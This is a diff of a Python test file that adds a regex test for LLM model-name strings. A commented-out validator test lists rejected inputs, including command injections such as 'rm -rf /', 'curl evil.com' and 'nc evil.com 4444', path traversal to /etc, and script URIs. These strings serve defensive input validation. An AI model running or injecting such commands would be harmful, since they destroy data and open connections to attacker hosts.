@@ -1,4 +1,5 @@
 import os
+import re
 os.environ["NEST_ASYNCIO"] = "0"
 import json
 import json_repair
@@ -8,8 +9,8 @@ from random import SystemRandom
 from bitrecs.llms.prompt_factory import PromptFactory
 from bitrecs.commerce.product import CatalogProvider, Product, ProductFactory
 from bitrecs.validator.reward import CatalogValidator, validate_result_schema
+from bitrecs.utils.constants import RE_MODEL_NAME
 safe_random = SystemRandom()
-
 
 
 def test_basic_parsing():
@@ -562,3 +563,148 @@ def test_find_name_by_sku():
     match = ProductFactory.find_sku_name(sku, prodcut_json)
     print(f"match: {match}")
     assert match == "Giant Print Check Register Set of 2"
+
+
+def test_model_name_re():
+    valid_models = [        
+        'somemodel',
+        'openai/gpt-4o-mini-search-preview',
+        'tencent/hunyuan-a13b-instruct:free',
+        'model_custom',
+        'gemini2.1',
+        'chat-gpt',
+        'openai/gpt-4.1',
+        'openai/gpt-4.1:latest',
+        'qwen2.5-coder:latest',
+        'openai/gpt-4o-2024-05-13',
+        'openai/gpt-3.5-turbo-1106',
+        'anthropic/claude-3.7-sonnet:thinking',
+        'gemini-2.5-flash-lite-preview-06-17',
+        'deepseek/deepseek-chat-v3-0324',
+        'NousResearch/DeepHermes-3-Mistral-24B-Preview',
+        'openai/gpt-4ABC',
+        'meta-llama/llama-4-scout',
+        'meta-llama/Llama-4-Scout-17B-16E'
+    ]
+    for model in valid_models:
+        claned = RE_MODEL_NAME.sub("", model)
+        print(f"model: {model} - cleaned: {claned}")
+        assert claned == model, f"Model '{model}' did not match the regex correctly"
+
+
+
+
+
+# def test_model_name_validation():
+#     valid_models = [        
+#         'openai/gpt-4o-mini-search-preview',
+#         'tencent/hunyuan-a13b-instruct:free',
+#         'model_custom',
+#         'gemini2.1',
+#         'chat-gpt',     
+#         'openai/gpt-4.1',
+#         'openai/gpt-4.1:latest',
+#         'qwen2.5-coder:latest',
+#         'openai/gpt-4o-2024-05-13',
+#         'openai/gpt-3.5-turbo-1106',
+#         'anthropic/claude-3.7-sonnet:thinking',
+#         'gemini-2.5-flash-lite-preview-06-17',
+#         'deepseek/deepseek-chat-v3-0324',
+#         'NousResearch/DeepHermes-3-Mistral-24B-Preview',
+#         'openai/gpt-4ABC',
+#         'meta-llama/llama-4-scout'
+#     ]
+
+#     invalid_models = [
+#         'some model',
+#         # Structure violations
+#         'openai//gpt-4',  # Double slash
+#         'openai/gpt-4:tag:extra',  # Multiple colons
+#         'openai/gpt-4::extra',  # Double colon
+#         '/model',  # Starts with slash
+#         'openai/',  # Ends with slash
+#         'openai/gpt-4/',  # Ends with slash
+#         'openai/gpt-4:',  # Ends with colon
+        
+#         # Invalid characters
+#         'openai/gpt-4!@#',   # Special symbols
+#         'openai/gpt-4%41',   # URL encoding
+#         'openai/gpt-4&#65;', # HTML entities  
+#         'openai/gpt-4<>[]',  # Brackets
+#         'openai/gpt-4"\'\\', # Quotes and escapes
+#         'openai/gpt-4~`|',   # Tilde, backtick, pipe
+#         'openai/gpt-4+=',    # Plus and equals
+#         'openai/gpt-4 space', # Spaces
+#         'openai/gpt-4\t',    # Tab
+#         'openai/gpt-4\n',    # Newline
+#         'openai/gpt-4\r',    # Carriage return
+        
+#         # Control characters
+#         'openai/gpt-4\x00',  # NULL
+#         'openai/gpt-4\x01',  # Start of heading
+#         'openai/gpt-4\x08',  # Backspace
+#         'openai/gpt-4\x0c',  # Form feed
+#         'openai/gpt-4\x1f',  # Unit separator
+#         'openai/gpt-4\x7f',  # DEL
+        
+#         # Length violations
+#         'a' * 200,  # Too long overall
+#         'openai/' + 'a' * 150,  # Model name too long
+#         'openai/gpt-4:' + 'a' * 100,  # Tag too long
+#         'a' * 60 + '/model',  # Provider too long
+        
+#         # Empty/whitespace
+#         '',  # Empty string
+#         ' ',  # Single space
+#         '   ',  # Multiple spaces
+        
+#         # Unicode attacks
+#         'openai/gpt-4\u200b',  # Zero-width space
+#         'openai/gpt-4\u2060',  # Word joiner
+#         'openai/gpt-4\ufeff',  # BOM
+#         'оpenai/gpt-4',  # Cyrillic 'о'
+#         'openai/ɡpt-4',  # Script 'ɡ'
+#         'openai/gpt-４',  # Full-width '４'
+        
+#         # Path traversal  
+#         'openai/../gpt-4',  # Parent directory
+#         'openai/./gpt-4',   # Current directory
+#         'openai/gpt-4/../../etc',  # Multi-level traversal
+        
+#         # URL schemes
+#         'http://evil.com',  # HTTP
+#         'https://evil.com', # HTTPS
+#         'javascript:alert(1)', # JavaScript
+#         'data:text/html,<script>', # Data URI
+        
+#         # Command injection
+#         'openai/gpt-4; rm -rf /',  # Command separator
+#         'openai/gpt-4 && curl evil.com',  # Command chaining
+#         'openai/gpt-4 | nc evil.com 4444',  # Pipe
+#         'openai/gpt-4 `whoami`',  # Command substitution
+#         'openai/gpt-4 $(whoami)',  # Command substitution        
+        
+#         # Invalid UTF-8
+#         'openai/gpt-4\xff\xfe',  # Invalid UTF-8
+#         'openai/gpt-4\xc0\x80',  # Overlong encoding
+#     ]
+    
+#     pattern = RE_MODEL
+#     for model in valid_models:
+#         # Check for control characters and whitespace first
+#         if any(ord(c) < 32 or ord(c) == 127 for c in model) or ' ' in model:
+#             assert False, f"Model '{model}' contains invalid characters"
+        
+#         match = re.match(pattern, model)
+#         assert match is not None, f"Model '{model}' should be valid but was rejected"
+#         print(f"Model '{model}' is valid.")    
+    
+#     for model in invalid_models:        
+#         has_control_chars = any(ord(c) < 32 or ord(c) == 127 for c in model) or ' ' in model
+#         match = re.match(pattern, model)
+#         assert match is None, f"Model '{model}' should be invalid but was accepted"
+        
+#         # Model should be invalid if it has control chars OR doesn't match pattern
+#         assert has_control_chars or match is None, f"Model '{model}' should be invalid but was accepted"
+#         print(f"Model '{model}' is correctly rejected.")    
+    
